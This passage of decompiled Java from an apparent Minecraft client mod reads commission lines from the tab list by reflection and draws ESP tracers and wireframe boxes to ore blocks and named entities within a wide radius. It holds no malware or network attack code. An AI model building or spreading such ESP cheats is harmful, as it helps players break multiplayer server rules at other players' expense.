/* 680 */     for (int j = startIndex; j < tabLines.size() && this.commissionOverlayLines.size() < 8; j++) {
/* 681 */       String line = tabLines.get(j);
/* 682 */       if (line == null || line.isBlank()) {
/* 683 */         if (this.commissionOverlayLines.size() > 1) {
/*     */           break;
/*     */         }
/*     */         continue;
/*     */       } 
/* 688 */       if (isCommissionHeaderLine(line)) {
/*     */         continue;
/*     */       }
/* 691 */       if (line.endsWith(":") && !looksLikeCommissionLine(line)) {
/* 692 */         if (this.commissionOverlayLines.size() > 1) {
/*     */           break;
/*     */         }
/*     */         continue;
/*     */       } 
/* 697 */       if (!looksLikeCommissionLine(line)) {
/* 698 */         if (this.commissionOverlayLines.size() > 1) {
/*     */           break;
/*     */         }
/*     */         continue;
/*     */       } 
/* 703 */       this.commissionOverlayLines.add(line);
/*     */     } 
/* 705 */     if (this.commissionOverlayLines.size() <= 1) {
/* 706 */       this.commissionOverlayLines.clear();
/* 707 */       this.commissionHeaderDetected = false;
/*     */     }
/*     */   }
/*     */   
/*     */   private int findFallbackCommissionStart(List<String> tabLines) {
/* 710 */     if (tabLines == null || tabLines.isEmpty()) {
/* 711 */       return -1;
/*     */     }
/* 713 */     for (int i = 0; i < tabLines.size(); i++) {
/* 714 */       String line = tabLines.get(i);
/* 715 */       if (!looksLikeCommissionLine(line)) {
/*     */         continue;
/*     */       }
/* 718 */       int streak = 0;
/* 719 */       for (int j = i; j < tabLines.size() && j < i + 6; j++) {
/* 720 */         if (looksLikeCommissionLine(tabLines.get(j))) {
/* 721 */           streak++;
/*     */         } else if (tabLines.get(j) == null || tabLines.get(j).isBlank()) {
/*     */           
/*     */           break;
/*     */         } 
/*     */       } 
/* 727 */       if (streak >= 2) {
/* 728 */         return i;
/*     */       }
/*     */     } 
/* 731 */     return -1;
/*     */   }
/*     */   
/*     */   private List<String> readTabMenuLines() {
/* 735 */     List<String> lines = new ArrayList<>();
/* 736 */     class_355 playerListHud = null;
/*     */     try {
/* 738 */       if (this.mc.field_1705 != null) {
/* 739 */         Object hudObject = invokeNoArg(this.mc.field_1705, new String[] { "method_1750", "getPlayerListHud" });
/* 740 */         if (hudObject instanceof class_355) {
/* 741 */           playerListHud = (class_355)hudObject;
/*     */         }
/*     */       } 
/* 744 */     } catch (ReflectiveOperationException reflectiveOperationException) {}
/* 745 */     appendTabHeaderFooterLines(lines, playerListHud);
/* 746 */     appendDisplayedTabHudEntries(playerListHud, lines);
/* 747 */     class_634 networkHandler = this.mc.method_1562();
/* 748 */     if (networkHandler == null) {
/* 749 */       return lines;
/*     */     }
/* 751 */     appendTabEntryLines(networkHandler.method_2880(), lines, playerListHud);
/* 752 */     return lines;
/*     */   }
/*     */   
/*     */   private void appendDisplayedTabHudEntries(class_355 playerListHud, List<String> lines) {
/* 756 */     if (playerListHud == null || lines == null) {
/*     */       return;
/*     */     }
/*     */     try {
/* 760 */       Method method = playerListHud.getClass().getDeclaredMethod("method_48213", new Class[0]);
/* 761 */       method.setAccessible(true);
/* 762 */       Object value = method.invoke(playerListHud, new Object[0]);
/* 763 */       if (!(value instanceof Iterable)) {
/*     */         return;
/*     */       }
/* 766 */       appendTabEntryLines((Iterable)value, lines, playerListHud);
/* 767 */     } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */   }
/*     */   
/*     */   private void appendTabHeaderFooterLines(List<String> lines, class_355 playerListHud) {
/* 771 */     if (lines == null || playerListHud == null) {
/*     */       return;
/*     */     }
/* 774 */     appendLinesFromPlayerListField(playerListHud, "field_2154", lines);
/* 775 */     appendLinesFromPlayerListField(playerListHud, "field_2153", lines);
/*     */   }
/*     */   
/*     */   private void appendLinesFromPlayerListField(Object playerListHud, String fieldName, List<String> lines) {
/* 736 */     if (playerListHud == null || fieldName == null || lines == null) {
/*     */       return;
/*     */     }
/*     */     try {
/* 740 */       Field field = playerListHud.getClass().getDeclaredField(fieldName);
/* 741 */       field.setAccessible(true);
/* 742 */       Object value = field.get(playerListHud);
/* 743 */       if (value instanceof class_2561) {
/* 744 */         appendMultilineText(((class_2561)value).getString(), lines);
/*     */       }
/* 746 */     } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */   }
/*     */   
/*     */   private void appendMultilineText(String rawText, List<String> lines) {
/* 750 */     if (rawText == null || lines == null) {
/*     */       return;
/*     */     }
/* 753 */     String cleaned = class_124.method_539(rawText).replace('\r', '\n');
/* 754 */     String[] split = cleaned.split("\\n");
/* 755 */     for (String part : split) {
/* 756 */       String normalized = normalizeTabLine(part);
/* 757 */       if (!normalized.isEmpty()) {
/* 758 */         lines.add(normalized);
/*     */       }
/*     */     } 
/*     */   }
/*     */   
/*     */   private void appendTabEntryLines(Iterable<?> entries, List<String> lines, class_355 playerListHud) {
/* 789 */     if (entries == null || lines == null) {
/*     */       return;
/*     */     }
/* 792 */     for (Object obj : entries) {
/* 793 */       if (!(obj instanceof class_640)) {
/*     */         continue;
/*     */       }
/* 796 */       String line = getTabLineFromEntry((class_640)obj, playerListHud);
/* 797 */       if (line != null && !line.isBlank()) {
/* 798 */         lines.add(line);
/*     */       }
/*     */     } 
/*     */   }
/*     */   
/*     */   private String getTabLineFromEntry(class_640 entry, class_355 playerListHud) {
/* 745 */     if (entry == null) {
/* 746 */       return null;
/*     */     }
/* 748 */     String raw = null;
/*     */     try {
/* 750 */       if (playerListHud != null) {
/* 751 */         class_2561 rendered = playerListHud.method_1918(entry);
/* 752 */         if (rendered != null) {
/* 753 */           raw = rendered.getString();
/*     */         }
/*     */       } 
/* 756 */     } catch (Throwable throwable) {}
/* 757 */     if (raw == null || raw.isBlank()) {
/* 758 */       class_2561 displayName = entry.method_2971();
/* 759 */       if (displayName != null) {
/* 760 */         raw = displayName.getString();
/*     */       }
/*     */     }
/* 753 */     if ((raw == null || raw.isBlank()) && entry.method_2966() != null) {
/*     */       try {
/* 755 */         Object profileName = invokeNoArg(entry.method_2966(), new String[] { "getName", "method_1676" });
/* 756 */         if (profileName instanceof String) {
/* 757 */           raw = (String)profileName;
/*     */         }
/* 759 */       } catch (ReflectiveOperationException reflectiveOperationException) {}
/*     */     }
/* 761 */     String normalized = normalizeTabLine(raw);
/* 762 */     return normalized.isEmpty() ? null : normalized;
/*     */   }
/*     */   
/*     */   private String normalizeTabLine(String line) {
/* 761 */     if (line == null) {
/* 762 */       return "";
/*     */     }
/* 764 */     String cleaned = class_124.method_539(line).replace('\u00A0', ' ').trim();
/* 765 */     return cleaned.replaceAll("\\s+", " ");
/*     */   }
/*     */   
/*     */   private boolean isCommissionHeaderLine(String line) {
/* 769 */     if (line == null || line.isBlank()) {
/* 770 */       return false;
/*     */     }
/* 772 */     String normalized = normalizeTabLine(line).toLowerCase(Locale.ROOT);
/* 773 */     return normalized.contains("commissions:");
/*     */   }
/*     */   
/*     */   private boolean looksLikeCommissionLine(String line) {
/* 777 */     if (line == null || line.isBlank() || line.indexOf(':') < 0) {
/* 778 */       return false;
/*     */     }
/* 780 */     String lower = line.toLowerCase(Locale.ROOT);
/* 781 */     return (line.contains("%") || lower.endsWith("done") || lower.endsWith("completed"));
/*     */   }
/*     */   
/*     */   private void clearCommissionOverlayData() {
/* 785 */     this.commissionOverlayTickCounter = 0;
/* 786 */     this.commissionOverlayLines.clear();
/* 787 */     this.commissionHeaderDetected = false;
/*     */   }
/*     */   
/*     */   private void renderBlockTasks(List<Object> tasks, Boolean enabled) {
/* 586 */     if (enabled == null || !enabled.booleanValue() || tasks.isEmpty()) {
/*     */       return;
/*     */     }
/* 589 */     for (Object task : tasks) {
/*     */       try {
/* 591 */         this.addRenderTaskMethod.invoke(null, new Object[] { task });
/* 596 */       } catch (ReflectiveOperationException ignored) {
/* 597 */         this.titaniumRenderBridgeReady = false;
/*     */         return;
/*     */       }
/*     */     }
/*     */   }
/*     */   
/*     */   private void renderEspTracers(Render3DEvent event) {
/* 602 */     if (!((Boolean)this.tracerEnabled.getValue()).booleanValue()) {
/*     */       return;
/*     */     }
/* 611 */     class_243 tracerStart = getTracerStart(event);
/* 612 */     if (tracerStart == null) {
/*     */       return;
/*     */     }
/* 615 */     double thicknessPx = getTracerThicknessPixels();
/* 616 */     if (thicknessPx <= 0.0D) {
/*     */       return;
/*     */     }
/* 620 */     List<class_2338> targets = new ArrayList<>();
/* 621 */     List<Colour> targetColours = new ArrayList<>();
/* 622 */     collectTracerTargets(this.titaniumBlocks, (Boolean)this.titaniumHighlightEnabled.getValue(), TITANIUM_OUTLINE_COLOUR, targets, targetColours);
/* 623 */     collectTracerTargets(this.nodeBlocks, (Boolean)this.nodeHighlightEnabled.getValue(), NODE_OUTLINE_COLOUR, targets, targetColours);
/* 624 */     if (targets.isEmpty()) {
/*     */       return;
/*     */     }
/* 627 */     if (((Boolean)this.tracerClosestOnly.getValue()).booleanValue()) {
/* 628 */       renderClosestTracer(targets, targetColours, tracerStart, thicknessPx);
/*     */       return;
/*     */     }
/* 631 */     renderTracerTargets(targets, targetColours, tracerStart, thicknessPx);
/*     */   }
/*     */   
/*     */   private void collectTracerTargets(List<class_2338> blocks, Boolean enabled, Colour tracerColour, List<class_2338> targets, List<Colour> targetColours) {
/* 634 */     if (enabled == null || !enabled.booleanValue() || blocks.isEmpty()) {
/*     */       return;
/*     */     }
/* 637 */     for (class_2338 pos : blocks) {
/* 638 */       targets.add(pos);
/* 639 */       targetColours.add(tracerColour);
/*     */     }
/*     */   }
/*     */   
/*     */   private void renderClosestTracer(List<class_2338> targets, List<Colour> colours, class_243 tracerStart, double thicknessPx) {
/* 644 */     int closestIndex = -1;
/* 645 */     double closestDistanceSq = Double.MAX_VALUE;
/* 646 */     double sx = tracerStart.method_10216();
/* 647 */     double sy = tracerStart.method_10214();
/* 648 */     double sz = tracerStart.method_10215();
/* 649 */     for (int i = 0; i < targets.size(); i++) {
/* 650 */       class_2338 pos = targets.get(i);
/* 651 */       double tx = pos.method_10263() + 0.5D;
/* 652 */       double ty = pos.method_10264() + 0.5D;
/* 653 */       double tz = pos.method_10260() + 0.5D;
/* 654 */       double dx = tx - sx;
/* 655 */       double dy = ty - sy;
/* 656 */       double dz = tz - sz;
/* 657 */       double distanceSq = dx * dx + dy * dy + dz * dz;
/* 658 */       if (distanceSq < closestDistanceSq) {
/* 659 */         closestDistanceSq = distanceSq;
/* 660 */         closestIndex = i;
/*     */       }
/*     */     }
/* 663 */     if (closestIndex < 0) {
/*     */       return;
/*     */     }
/* 666 */     class_2338 pos = targets.get(closestIndex);
/* 667 */     class_243 target = new class_243(pos.method_10263() + 0.5D, pos.method_10264() + 0.5D, pos.method_10260() + 0.5D);
/* 668 */     renderThickMergedTracerLine(tracerStart, target, colours.get(closestIndex), thicknessPx);
/*     */   }
/*     */   
/*     */   private void renderTracerTargets(List<class_2338> targets, List<Colour> colours, class_243 tracerStart, double thicknessPx) {
/* 672 */     for (int i = 0; i < targets.size(); i++) {
/* 673 */       class_2338 pos = targets.get(i);
/* 674 */       class_243 target = new class_243(pos.method_10263() + 0.5D, pos.method_10264() + 0.5D, pos.method_10260() + 0.5D);
/* 675 */       renderThickMergedTracerLine(tracerStart, target, colours.get(i), thicknessPx);
/*     */     }
/*     */   }
/*     */   
/*     */   private void renderCustomEntityTracers(Render3DEvent.Start event) {
/* 679 */     if (!((Boolean)this.customHighlightEnabled.getValue()).booleanValue() || !((Boolean)this.customTracerEnabled.getValue()).booleanValue()) {
/*     */       return;
/*     */     }
/* 682 */     if (this.customEntityBoxes.isEmpty()) {
/*     */       return;
/*     */     }
/* 685 */     class_243 tracerStart = getTracerStart((Render3DEvent)event);
/* 686 */     if (tracerStart == null) {
/*     */       return;
/*     */     }
/* 689 */     double thicknessPx = getCustomTracerThicknessPixels();
/* 690 */     if (thicknessPx <= 0.0D) {
/*     */       return;
/*     */     }
/* 693 */     if (((Boolean)this.customTracerClosestOnly.getValue()).booleanValue()) {
/* 694 */       class_238 closest = null;
/* 695 */       double bestDistSq = Double.MAX_VALUE;
/* 696 */       for (class_238 box : this.customEntityBoxes) {
/* 697 */         class_243 center = getBoxCenter(box);
/* 698 */         double dx = center.method_10216() - tracerStart.method_10216();
/* 699 */         double dy = center.method_10214() - tracerStart.method_10214();
/* 700 */         double dz = center.method_10215() - tracerStart.method_10215();
/* 701 */         double distSq = dx * dx + dy * dy + dz * dz;
/* 702 */         if (distSq < bestDistSq) {
/* 703 */           bestDistSq = distSq;
/* 704 */           closest = box;
/*     */         }
/*     */       } 
/* 707 */       if (closest != null) {
/* 708 */         renderThickMergedTracerLine(tracerStart, getBoxCenter(closest), CUSTOM_OUTLINE_COLOUR, thicknessPx);
/*     */       }
/*     */       return;
/*     */     } 
/* 712 */     for (class_238 box : this.customEntityBoxes) {
/* 713 */       renderThickMergedTracerLine(tracerStart, getBoxCenter(box), CUSTOM_OUTLINE_COLOUR, thicknessPx);
/*     */     }
/*     */   }
/*     */   
/*     */   private class_243 getBoxCenter(class_238 box) {
/* 718 */     return new class_243((box.field_1323 + box.field_1320) * 0.5D, (box.field_1322 + box.field_1325) * 0.5D, (box.field_1321 + box.field_1324) * 0.5D);
/*     */   }
/*     */   
/*     */   private void renderThickMergedTracerLine(class_243 start, class_243 end, Colour tracerColour, double thicknessPx) {
/*     */     try {
/* 681 */       if (this.lineConstructor == null) {
/* 682 */         this.lineConstructor = resolveLineConstructor();
/*     */       }
/* 684 */       if (this.lineConstructor == null) {
/*     */         return;
/*     */       }
/* 687 */       Object centerLine = buildLineTask(start, end, tracerColour);
/* 688 */       this.addRenderTaskMethod.invoke(null, new Object[] { centerLine });
/* 689 */       int radialSteps = Math.max(1, Math.min(12, (int)Math.ceil(thicknessPx / 8.0D)));
/* 690 */       if (radialSteps <= 1) {
/*     */         return;
/*     */       }
/* 693 */       double sx = start.method_10216();
/* 694 */       double sy = start.method_10214();
/* 695 */       double sz = start.method_10215();
/* 696 */       double ex = end.method_10216();
/* 697 */       double ey = end.method_10214();
/* 698 */       double ez = end.method_10215();
/* 699 */       double dx = ex - sx;
/* 700 */       double dy = ey - sy;
/* 701 */       double dz = ez - sz;
/* 702 */       double len = Math.sqrt(dx * dx + dy * dy + dz * dz);
/* 703 */       if (len <= 1.0E-6D) {
/*     */         return;
/*     */       }
/* 706 */       dx /= len;
/* 707 */       dy /= len;
/* 708 */       dz /= len;
/* 709 */       double ax = (Math.abs(dy) > 0.95D) ? 1.0D : 0.0D;
/* 710 */       double ay = (Math.abs(dy) > 0.95D) ? 0.0D : 1.0D;
/* 711 */       double az = 0.0D;
/* 712 */       double ux = dy * az - dz * ay;
/* 713 */       double uy = dz * ax - dx * az;
/* 714 */       double uz = dx * ay - dy * ax;
/* 715 */       double uLen = Math.sqrt(ux * ux + uy * uy + uz * uz);
/* 716 */       if (uLen <= 1.0E-6D) {
/*     */         return;
/*     */       }
/* 719 */       ux /= uLen;
/* 720 */       uy /= uLen;
/* 721 */       uz /= uLen;
/* 722 */       double vx = dy * uz - dz * uy;
/* 723 */       double vy = dz * ux - dx * uz;
/* 724 */       double vz = dx * uy - dy * ux;
/* 725 */       double outerRadius = thicknessPx * 0.0005D;
/* 726 */       double step = outerRadius / radialSteps;
/* 727 */       for (int ring = 1; ring <= radialSteps; ring++) {
/* 728 */         double radius = ring * step;
/* 729 */         int points = Math.max(8, (int)Math.ceil(6.283185307179586D * radius / step));
/* 730 */         for (int i = 0; i < points; i++) {
/* 731 */           double angle = 6.283185307179586D * i / points;
/* 732 */           double ox = (ux * Math.cos(angle) + vx * Math.sin(angle)) * radius;
/* 733 */           double oy = (uy * Math.cos(angle) + vy * Math.sin(angle)) * radius;
/* 734 */           double oz = (uz * Math.cos(angle) + vz * Math.sin(angle)) * radius;
/* 735 */           class_243 s = new class_243(sx + ox, sy + oy, sz + oz);
/* 736 */           class_243 t = new class_243(ex + ox, ey + oy, ez + oz);
/* 737 */           Object lineTask = buildLineTask(s, t, tracerColour);
/* 738 */           this.addRenderTaskMethod.invoke(null, new Object[] { lineTask });
/*     */         }
/*     */       }
/* 738 */     } catch (Exception ignored) {
/* 739 */       this.lineConstructor = null;
/*     */     }
/*     */   }
/*     */   
/*     */   private double getTracerThicknessPixels() {
/*     */     try {
/* 744 */       Object value = this.tracerThicknessPx.getValue();
/* 745 */       if (value instanceof java.math.BigDecimal) {
/* 746 */         return Math.max(1.0D, Math.min(100.0D, ((java.math.BigDecimal)value).doubleValue()));
/*     */       }
/* 748 */     } catch (Exception exception) {}
/*     */     
/* 750 */     return 30.0D;
/*     */   }
/*     */   
/*     */   private double getCustomTracerThicknessPixels() {
/*     */     try {
/* 754 */       Object value = this.customTracerThicknessPx.getValue();
/* 755 */       if (value instanceof java.math.BigDecimal) {
/* 756 */         return Math.max(1.0D, Math.min(100.0D, ((java.math.BigDecimal)value).doubleValue()));
/*     */       }
/* 758 */     } catch (Exception exception) {}
/*     */     
/* 760 */     return 30.0D;
/*     */   }
/*     */   
/*     */   
/*     */   private Object buildLineTask(class_243 start, class_243 end, Colour tracerColour) throws ReflectiveOperationException {
/* 807 */     Class<?>[] params = this.lineConstructor.getParameterTypes();
/* 808 */     Object startArg = adaptLineVector(start, params[0]);
/* 809 */     Object endArg = adaptLineVector(end, params[1]);
/* 810 */     return this.lineConstructor.newInstance(new Object[] { startArg, endArg, tracerColour, tracerColour, Boolean.valueOf(false) });
/*     */   }
/*     */   
/*     */   private Object adaptLineVector(class_243 vec, Class<?> targetType) throws ReflectiveOperationException {
/* 754 */     if (targetType.isInstance(vec)) {
/* 755 */       return vec;
/*     */     }
/* 757 */     Constructor<?> vecConstructor = targetType.getConstructor(new Class[] { double.class, double.class, double.class });
/* 758 */     return vecConstructor.newInstance(new Object[] { Double.valueOf(vec.method_10216()), Double.valueOf(vec.method_10214()), Double.valueOf(vec.method_10215()) });
/*     */   }
/*     */   
/*     */   private void updateCustomHighlightData() {
/* 604 */     this.customMatchedEntities.clear();
/* 605 */     if (!((Boolean)this.customHighlightEnabled.getValue()).booleanValue() || this.mc.field_1687 == null || this.mc.field_1724 == null) {
/* 606 */       clearCustomHighlightData();
/*     */       return;
/*     */     }
/* 609 */     Set<String> wantedNames = getConfiguredEntityNames();
/* 610 */     if (wantedNames.isEmpty()) {
/* 611 */       clearCustomHighlightData();
/*     */       return;
/*     */     }
/* 613 */     Iterable<?> entities = getEntityIterable(this.mc.field_1687);
/* 614 */     if (entities == null) {
/* 615 */       clearCustomHighlightData();
/*     */       return;
/*     */     }
/* 617 */     List<net.minecraft.class_1297> allEntities = new ArrayList<>();
/* 618 */     for (Object obj : entities) {
/* 619 */       if (!(obj instanceof net.minecraft.class_1297)) {
/*     */         continue;
/*     */       }
/* 622 */       net.minecraft.class_1297 entity = (net.minecraft.class_1297)obj;
/* 623 */       if (entity != this.mc.field_1724) {
/* 624 */         allEntities.add(entity);
/*     */       }
/*     */     } 
/* 627 */     Set<net.minecraft.class_1297> matchedTargets = Collections.newSetFromMap(new IdentityHashMap<>());
/* 628 */     for (net.minecraft.class_1297 namedEntity : allEntities) {
/* 629 */       String name = getEntityNametag(namedEntity);
/* 630 */       if (!matchesConfiguredNametag(name, wantedNames)) {
/*     */         continue;
/*     */       }
/* 633 */       net.minecraft.class_1297 target = resolveNametagTargetEntity(namedEntity, allEntities);
/* 634 */       if (target != null) {
/* 635 */         matchedTargets.add(target);
/*     */       }
/*     */     } 
/* 638 */     this.customMatchedEntities.addAll(matchedTargets);
/*     */   }
/*     */   
/*     */   private void rebuildCustomHighlightFrameData() {
/* 643 */     this.customEntityBoxes.clear();
/* 644 */     this.customEntityRenderTasks.clear();
/* 645 */     if (!isEnabled() || !((Boolean)this.customHighlightEnabled.getValue()).booleanValue() || this.customMatchedEntities.isEmpty()) {
/* 646 */       this.customSmoothedBoxes.clear();
/*     */       return;
/*     */     }
/* 648 */     List<net.minecraft.class_1297> snapshot = new ArrayList<>(this.customMatchedEntities);
/* 649 */     IdentityHashMap<net.minecraft.class_1297, class_238> nextSmoothed = new IdentityHashMap<>();
/* 650 */     for (net.minecraft.class_1297 entity : snapshot) {
/* 651 */       if (entity == null) {
/*     */         continue;
/*     */       }
/*     */       try {
/* 655 */         class_238 box = entity.method_5829();
/* 656 */         if (box == null) {
/*     */           continue;
/*     */         }
/* 659 */         class_238 raw = new class_238(box.field_1323 - CUSTOM_BOX_PADDING, box.field_1322 - CUSTOM_BOX_PADDING, box.field_1321 - CUSTOM_BOX_PADDING, box.field_1320 + CUSTOM_BOX_PADDING, box.field_1325 + CUSTOM_BOX_PADDING, box.field_1324 + CUSTOM_BOX_PADDING);
/* 660 */         class_238 previous = this.customSmoothedBoxes.get(entity);
/* 661 */         class_238 smooth = (previous == null) ? raw : lerpBox(previous, raw, CUSTOM_BOX_SMOOTHING);
/* 662 */         nextSmoothed.put(entity, smooth);
/* 663 */         this.customEntityBoxes.add(smooth);
/* 664 */       } catch (Throwable throwable) {}
/*     */     } 
/* 667 */     this.customSmoothedBoxes.clear();
/* 668 */     this.customSmoothedBoxes.putAll(nextSmoothed);
/* 669 */     rebuildEntityRenderTasks(this.customEntityBoxes, this.customEntityRenderTasks, CUSTOM_FILL_COLOUR, CUSTOM_OUTLINE_COLOUR);
/*     */   }
/*     */   
/*     */   private class_238 lerpBox(class_238 from, class_238 to, double alpha) {
/* 673 */     double t = Math.max(0.0D, Math.min(1.0D, alpha));
/* 674 */     return new class_238(lerp(from.field_1323, to.field_1323, t), lerp(from.field_1322, to.field_1322, t), lerp(from.field_1321, to.field_1321, t), lerp(from.field_1320, to.field_1320, t), lerp(from.field_1325, to.field_1325, t), lerp(from.field_1324, to.field_1324, t));
/*     */   }
/*     */   
/*     */   private double lerp(double a, double b, double t) {
/* 678 */     return a + (b - a) * t;
/*     */   }
/*     */   
/*     */   private net.minecraft.class_1297 resolveNametagTargetEntity(net.minecraft.class_1297 namedEntity, List<net.minecraft.class_1297> allEntities) {
/* 650 */     if (namedEntity == null) {
/* 651 */       return null;
/*     */     }
/* 653 */     net.minecraft.class_1297 vehicle = getVehicleEntity(namedEntity);
/* 654 */     if (vehicle != null && vehicle != this.mc.field_1724) {
/* 655 */       return vehicle;
/*     */     }
/* 657 */     class_238 nameBox = namedEntity.method_5829();
/* 658 */     if (nameBox == null) {
/* 659 */       return namedEntity;
/*     */     }
/* 661 */     double nameWidth = Math.abs(nameBox.field_1320 - nameBox.field_1323);
/* 662 */     double nameHeight = Math.abs(nameBox.field_1325 - nameBox.field_1322);
/* 663 */     boolean likelyCarrier = (nameWidth <= 0.9D && nameHeight <= 1.3D);
/* 664 */     if (!likelyCarrier) {
/* 665 */       return namedEntity;
/*     */     }
/* 667 */     double nx = (nameBox.field_1323 + nameBox.field_1320) * 0.5D;
/* 668 */     double ny = (nameBox.field_1322 + nameBox.field_1325) * 0.5D;
/* 669 */     double nz = (nameBox.field_1321 + nameBox.field_1324) * 0.5D;
/* 670 */     net.minecraft.class_1297 best = namedEntity;
/* 671 */     double bestScore = Double.MAX_VALUE;
/* 672 */     for (net.minecraft.class_1297 candidate : allEntities) {
/* 673 */       if (candidate == namedEntity || candidate == this.mc.field_1724) {
/*     */         continue;
/*     */       }
/* 676 */       class_238 cBox = candidate.method_5829();
/* 677 */       if (cBox == null) {
/*     */         continue;
/*     */       }
/* 680 */       double cWidth = Math.abs(cBox.field_1320 - cBox.field_1323);
/* 681 */       double cHeight = Math.abs(cBox.field_1325 - cBox.field_1322);
/* 682 */       if (cWidth < 0.4D || cHeight < 0.4D) {
/*     */         continue;
/*     */       }
/* 685 */       double cx = (cBox.field_1323 + cBox.field_1320) * 0.5D;
/* 686 */       double cy = (cBox.field_1322 + cBox.field_1325) * 0.5D;
/* 687 */       double cz = (cBox.field_1321 + cBox.field_1324) * 0.5D;
/* 688 */       double dx = cx - nx;
/* 689 */       double dz = cz - nz;
/* 690 */       double horizontal = Math.sqrt(dx * dx + dz * dz);
/* 691 */       if (horizontal > 2.5D) {
/*     */         continue;
/*     */       }
/* 694 */       double dy = cy - ny;
/* 695 */       if (dy > 1.5D || dy < -5.0D) {
/*     */         continue;
/*     */       }
/* 698 */       double sizeBonus = cWidth * cWidth + cHeight;
/* 699 */       double score = horizontal * 2.0D + Math.max(0.0D, dy) * 1.25D + Math.max(0.0D, -dy) * 0.2D - sizeBonus * 0.35D;
/* 700 */       if (score < bestScore) {
/* 701 */         bestScore = score;
/* 702 */         best = candidate;
/*     */       }
/*     */     } 
/* 705 */     return best;
/*     */   }
/*     */   
/*     */   private net.minecraft.class_1297 getVehicleEntity(net.minecraft.class_1297 entity) {
/*     */     try {
/* 710 */       Object vehicle = invokeNoArg(entity, new String[] { "getVehicle", "method_5854" });
/* 711 */       if (vehicle instanceof net.minecraft.class_1297) {
/* 712 */         return (net.minecraft.class_1297)vehicle;
/*     */       }
/* 714 */     } catch (ReflectiveOperationException reflectiveOperationException) {}
/* 715 */     return null;
/*     */   }
/*     */   
/*     */   private void renderCustomEntityWireframes() {
/* 640 */     if (!((Boolean)this.customHighlightEnabled.getValue()).booleanValue() || this.customEntityBoxes.isEmpty()) {
/*     */       return;
/*     */     }
/*     */     try {
/* 644 */       if (this.lineConstructor == null) {
/* 645 */         this.lineConstructor = resolveLineConstructor();
/*     */       }
/* 647 */       if (this.lineConstructor == null) {
/*     */         return;
/*     */       }
/* 650 */       for (class_238 box : this.customEntityBoxes) {
/* 651 */         renderSingleWireframe(box, CUSTOM_OUTLINE_COLOUR);
/*     */       }
/* 653 */     } catch (Exception ignored) {
/* 654 */       this.lineConstructor = null;
/*     */     } 
/*     */   }
/*     */   
/*     */   private void renderSingleWireframe(class_238 box, Colour colour) throws ReflectiveOperationException {
/* 659 */     double minX = box.field_1323;
/* 660 */     double minY = box.field_1322;
/* 661 */     double minZ = box.field_1321;
/* 662 */     double maxX = box.field_1320;
/* 663 */     double maxY = box.field_1325;
/* 664 */     double maxZ = box.field_1324;
/*     */     
/* 666 */     class_243 p000 = new class_243(minX, minY, minZ);
/* 667 */     class_243 p001 = new class_243(minX, minY, maxZ);
/* 668 */     class_243 p010 = new class_243(minX, maxY, minZ);
/* 669 */     class_243 p011 = new class_243(minX, maxY, maxZ);
/* 670 */     class_243 p100 = new class_243(maxX, minY, minZ);
/* 671 */     class_243 p101 = new class_243(maxX, minY, maxZ);
/* 672 */     class_243 p110 = new class_243(maxX, maxY, minZ);
/* 673 */     class_243 p111 = new class_243(maxX, maxY, maxZ);
/*     */     
/* 675 */     submitLine(p000, p100, colour);
/* 676 */     submitLine(p000, p001, colour);
/* 677 */     submitLine(p001, p101, colour);
/* 678 */     submitLine(p100, p101, colour);
/* 679 */     submitLine(p010, p110, colour);
/* 680 */     submitLine(p010, p011, colour);
/* 681 */     submitLine(p011, p111, colour);
/* 682 */     submitLine(p110, p111, colour);
/* 683 */     submitLine(p000, p010, colour);
/* 684 */     submitLine(p001, p011, colour);
/* 685 */     submitLine(p100, p110, colour);
/* 686 */     submitLine(p101, p111, colour);
/*     */   }
/*     */   
/*     */   private void submitLine(class_243 start, class_243 end, Colour colour) throws ReflectiveOperationException {
/* 690 */     Object lineTask = buildLineTask(start, end, colour);
/* 691 */     this.addRenderTaskMethod.invoke(null, new Object[] { lineTask });
/*     */   }
/*     */   
/*     */   private Set<String> getConfiguredEntityNames() {
/* 641 */     String raw = (String)this.customHighlightNames.getValue();
/* 642 */     if (raw == null || raw.isBlank()) {
/* 643 */       this.cachedCustomNamesRaw = "";
/* 644 */       this.cachedCustomNames = Set.of();
/* 645 */       return this.cachedCustomNames;
/*     */     }
/* 647 */     if (raw.equals(this.cachedCustomNamesRaw)) {
/* 648 */       return this.cachedCustomNames;
/*     */     }
/* 650 */     Set<String> names = new HashSet<>();
/* 651 */     String[] split = raw.split("\\s*,\\s*");
/* 652 */     for (String part : split) {
/* 653 */       String cleaned = class_124.method_539(part).trim().toLowerCase(Locale.ROOT);
/* 654 */       if (!cleaned.isEmpty()) {
/* 655 */         names.add(cleaned);
/*     */       }
/*     */     }
/* 658 */     this.cachedCustomNamesRaw = raw;
/* 659 */     this.cachedCustomNames = names.isEmpty() ? Set.of() : Collections.unmodifiableSet(names);
/* 660 */     return this.cachedCustomNames;
/*     */   }
/*     */   
/*     */   private Iterable<?> getEntityIterable(class_1937 world) {
/* 657 */     if (world == null || this.mc.field_1724 == null) return null; 
/* 658 */     class_2338 p = this.mc.field_1724.method_24515();
/* 659 */     class_238 box = new class_238((p.method_10263() - 192), (p.method_10264() - 128), (p.method_10260() - 192), (p.method_10263() + 192), (p.method_10264() + 128), (p.method_10260() + 192));
/* 660 */     return world.method_8333(null, box, entity -> true);
/*     */   }
/*     */   
/*     */   private String getEntityNametag(Object entity) {
/* 687 */     if (!(entity instanceof net.minecraft.class_1297)) {
/* 688 */       return null;
/*     */     }
/* 690 */     net.minecraft.class_1297 e = (net.minecraft.class_1297)entity;
/* 691 */     if (!e.method_16914()) {
/* 692 */       return null;
/*     */     }
/* 694 */     net.minecraft.class_2561 text = e.method_5797();
/* 695 */     if (text == null) {
/* 696 */       return null;
/*     */     }
/* 698 */     String cleaned = class_124.method_539(text.getString()).trim();
/* 699 */     return cleaned.isEmpty() ? null : cleaned;
/*     */   }
/*     */   
/*     */   private void debugCustomHighlightScan() {
/* 703 */     if (this.mc.field_1687 == null || this.mc.field_1724 == null) {
/* 704 */       ChatUtils.chat(String.valueOf(class_124.field_1061) + "Debug nametags: world/player unavailable.", new Object[0]);
/*     */       return;
/*     */     }
/* 707 */     Set<String> wanted = getConfiguredEntityNames();
/* 708 */     Iterable<?> entities = getEntityIterable(this.mc.field_1687);
/* 709 */     if (entities == null) {
/* 710 */       ChatUtils.chat(String.valueOf(class_124.field_1061) + "Debug nametags: entity iterable is null.", new Object[0]);
/*     */       return;
/*     */     }
/* 713 */     int total = 0;
/* 714 */     int customNamed = 0;
